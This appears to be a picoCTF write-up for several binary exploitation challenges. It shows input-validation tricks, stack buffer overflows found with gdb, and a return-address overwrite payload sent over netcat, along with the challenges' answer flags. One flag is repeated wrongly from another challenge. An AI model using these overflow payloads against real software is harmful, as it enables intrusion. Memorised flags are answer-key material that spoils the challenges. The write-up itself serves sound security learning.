# **Binary Exploitation**

- [x] [basic-file-exploit (100)](#basic-file-exploit)
- [x] [buffer overflow 0 (100)](#buffer-overflow-0)
- [x] [CVE-XXXX-XXXX (100)](#CVE-XXXX-XXXX)
- [x] [buffer overflow 1 (200)](#buffer-overflow-1)
- [ ] x-sixty-what
- [x] [RPS (200)](#RPS)
- [x] buffer overflow 2
- [ ] buffer overflow 3
- [ ] flag leak
- [ ] ropfu
- [ ] wine
- [ ] function overwrite
- [ ] stack cache
- [ ] solfire

## **basic-file-exploit**

### ***Description***

The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! <br>
Connect to the program with netcat: <br>
`$ nc saturn.picoctf.net 50366` <br>
The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/538/program-redacted.c).

<details>
    <summary>Hint 1</summary>
    Try passing in things the program doesn't expect. Like a string instead of a number.
</details>

### ***Writeup***

Look through the soruce code and find where the flag might be.
There is a flag char*, but it is redacted, so let's see where it is used.
The pointer is outputted if `entry_number==0`, or if `strtol` errors.
The value of entry needs to be a letter for `strtol` to error.
The `data_read` function is called when option 2 is selected. Therefore, to trigger the flag, choose option 2 and pass in any string.

```python
└─$ nc saturn.picoctf.net 50366
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
a
a
Please enter the length of your data:
1
1
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
c
c
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_25D6CDDB}
```

Flag: `picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_25D6CDDB}`

## **buffer overflow 0**

### ***Description***

Smash the stack <br>
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: <br>
`nc saturn.picoctf.net 64712`

<details>
    <summary>Hint 1</summary>
    How can you trigger the flag to print?
</details>
<details>
    <summary>Hint 2</summary>
    If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
</details>
<details>
    <summary>Hint 3</summary>
    Run `man gets` and read the BUGS section. How many characters can the program really read?
</details>

### ***Writeup***

If you cannot run the vuln executable, it might be because your OS does not support 32-bit programs. I recommend either [installing gcc-multilib](https://superuser.com/a/1603878) to install libc6 to run a 32-bit ELF on a 64-bit architecture (`sudo apt install gcc-multilib`), or use the gcc compiler and compile the C code (`gcc vuln.c -o vuln`).

Looking at the vuln code, I can see that it first takes the contents of `flag.txt` and copies it to the global buffer `flag` using `fgets`. It then takes user input and writes it to `buf1` which is of size 100. Then, it calls the `vuln` void function which will use `strcpy` and copy the contents of `buf1` to `buf2` which is of size 16 using `gets`.

The error here is the vulnerable `strcpy` function, because it will write all the bytes from the input buffer to the destination buffer, and it can even write past the buffer (which is called a buffer overflow).

Attempting to execute vuln shows that it needs a `flag.txt`, so I created a new `flag.txt` file with some random string. This will be used later to test whether the contents of flag are printed out onto the console.

```bash
└─$ cat flag.txt
picoCTF{random_string}
```

I am going to write 16 A's into `input.txt` and feed it into the vuln program to see what happens.

```bash
└─$ python3 -c "print('A'*16)" > input.txt ; ./vuln < input.txt
Input: The program will exit now
```

As expected, nothing much and t	he program exits nicely. Time to use GDB! Reason why I am using multiple A's is because since A is 0x41, I just have to look multiple occurrences of 0x41 in the stack. Run `gdb vuln` and then `layout asm` to get the assembly as well as the debugger console. If you are using `layout asm`, the memory addresses displayed may not be correct (not sure why). For example, it might say main starts at address 0x1382, which is incorrect. I recommend running the program once to display the correct addresses, so main should start at `0x56556382`.

Correct memory addresses:
![after_layout_asm](Binary_Exploitation/buffer_overflow_0/after_layout_asm.png)

Since `strcpy` is in the vuln function, I am going to analyze the assembly at that section by doing `disas vuln`. The `strcpy` function is called at address  `0x56556374`, so I will set a breakpoint at the address right after the call by doing `b *0x56556379` so I can analyze the stack. Time to run the program once with `input.txt` by doing `r < input.txt` and see what the stack looks like.

The first 64 bytes of sp register:
![sp_with_16A](Binary_Exploitation/buffer_overflow_0/sp_with_16A.png)

I can see that `buf2` starts at address `0xffffd048` on the stack because that's where the `0x41` starts to appear. I also notice that at `0xffffd054` there is something stored there. Running `info frame` shows that `ebx` is stored there, which currently has the contents of `eax` as shown from the instruction at address `0x56556372`.

Frame info at the breakpoint after strcpy:
![ebx_register_location](Binary_Exploitation/buffer_overflow_0/ebx_register_location.png)

I am going to try and corrupt ebx register and possibly create a segmentation fault, I will write 20 A's into `input.txt` now and see what happens.

```bash
└─$ python3 -c "print('A'*20)" > input.txt ; ./vuln < input.txt
Input: picoCTF{random_string}
```

As expected, something was corrupt which outputted the contents of `flag`. Let's see what happened on the assembly scale.

![corrupt_sp](Binary_Exploitation/buffer_overflow_0/corrupt_sp.png)

Notice that at `0xffffd054` it changed from `0xac` to `0x00`, but `0xffffd055` remains unchanged and is still `0x8f`. This is because when writing the 20 A's into input.txt, the `gets` function reads it as 20 A's as well as the null-terminating character, so in reality 21 characters are written to `buf2`. 

If you look at memory address `0x5655635b`, the program allocates `0x14`, or in decimal 20 bytes for `buf2`. Even though buf2 was created on the stack with a size of 16, it needs the null-terminating charaters, so in reality `buf2` needs 17 bytes of storage. Since this is a 32-bit program, memory is stored in units of 4 bytes, and the smallest multiple of 4 greater than 17 is 20.

Any input greater than 19 characters will segfault the program, which then the signal handler will capture and call `sigsegv_handler` and will print the flag and fully exit. I took `input.txt` which already has 20 A's and fed the contents to the netcat connection.

```bash
└─$ python3 -c "print('A'*20)" > input.txt ; nc saturn.picoctf.net 64712 < input.txt
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_81929e72}
```

Flag: `picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_25D6CDDB}`

## **CVE-XXXX-XXXX**

### ***Description***

Enter the CVE of the vulnerability as the flag with the correct flag format: <br>
`picoCTF{CVE-XXXX-XXXXX}` replacing XXXX-XXXXX with the numbers for the matching vulnerability. <br>
The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.

<details>
    <summary>Hint 1</summary>
    We're not looking for the Local Spooler vulnerability in 2021...
</details>

### ***Writeup***

A quick Google search of "first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service" gives this [result](https://msrc.microsoft.com/update-guide/vulnerability/cve-2021-34527). Make sure that the Attack Vector is Network and not Local.

Flag: `picoCTF{CVE-2021-34527}`

## **buffer overflow 1**

### ***Description***

<button name="button" onclick="http://www.google.com">Launch Instance</button> <br>
Control the return address <br>
Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/253/vuln). <br>
You can view source [here](https://artifacts.picoctf.net/c/253/vuln.c). And connect with it using `nc saturn.picoctf.net 57610`
<details>
    <summary>Hint 1</summary>
    Make sure you consider big Endian vs small Endian.
    <summary>Hint 2</summary>
    Changing the address of the return pointer can call different functions.
</details>

### ***Writeup***

Looking at the source code in `vuln.c`, it seems that after calling the print function in the `main()` function, it jumps to the `vuln()` function and takes user input using `gets()` and stores it in the local character buffer `buf` of size 32. It then prints the return address of the function, and the program ends.

```bash
└─$ python3 -c "print('A'*32)" > input.txt ; ./vuln < input.txt
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

After running the vuln program multiple times with a string length of 32 and less, I noticed that the return address that the program jumps back to is the same, which is `0x804932f`.

There is also another function `win()` in the code that does not seem to be called anywhere in the program. The function seems to print the contents of `flag.txt`, which is what we are trying to achieve. Therefore, the goal is to change the return address so that in `vuln()` it does not jump back to `main()`, but to the other function `win()`.

Running `gdb vuln` followed by `layout asm` shows the assembly code of the binary, and running `disas win` shows that the function starts at address `0x80491f6`, which we want to change to be the address of `win()`. Only problem now is we need to find the size of the payload and how many A's we need so that we can reach and overwrite the return address.

Set a breakpoint at the start of address `0x80492a3` right after the `gets()` function is called. Running the debugger with `r < input.txt` I run `info frame` and notice that the return address is the `saved eip`, and the `eip` register is at address `0xffffd0bc` on the stack. Then running `x/64xb $sp`, I notice that `0x41` start appearing at address `0xffffd090` on the stack, which is where `buf` is.
Doing address subtraction shows that there is 44 bytes between where `buf` is and where the return address is.

```bash
(gdb) p 0xffffd0bc-0xffffd090
$1 = 44
```

Originally, my payload which was 44 A's followed by `\x08\x04\x93\x2f` did not work because the byte order is in little endian. Therefore, I had to reverse my payload as well as include a null terminating character to finish it off.

```bash
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'\x41'*44+b'\xf6\x91\x04\x08'+b'\x0a')" > input.txt ; nc saturn.picoctf.net 57610 < input.txt
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b9797671}
```

Flag: `picoCTF{addr3ss3s_ar3_3asy_b9797671}`

## **RPS**

### ***Description***

Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row. <br>
Connect to the program with netcat: <br>
`$ nc saturn.picoctf.net 50305` <br>
The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/445/game-redacted.c).

<details>
    <summary>Hint 1</summary>
    How does the program check if you won?
</details>

### ***Writeup***

Looking at the source code, I need `wins` to be greater than 5 for the program to print the flag to the console. The `wins` variable is accumulated if `play()` returns true, which is if `strstr(player_turn, loses[computer_turn])` also returns a non-zero result. Looking at the man pages for `strstr` shows that it is in the form of `char *strstr(const char *haystack, const char *needle)`, where `strstr()` finds the first occurrence of the substring `needle` in the string `haystack`. It then returns a pointer to the beginning of the located substring. Therefore, the program tries to find the specific string of `loses[computer_turn]` in the `player_turn` string that we provided to the program, where `char* loses[3] = {"paper", "scissors", "rock"};`. Essentially, create a string where if `strstr` tries to find the substring match it succeeds on all occurences, so such a string that does that is `rockpaperscissors` because each choice is a substring in that input string.

```bash
─$ nc saturn.picoctf.net 50305
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissor
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1

...

Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: scissors
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_D80B11AA}
Type '1' to play a game
Type '2' to exit the program
2
2
```

Flag: `picoCTF{50M3_3X7R3M3_1UCK_D80B11AA}`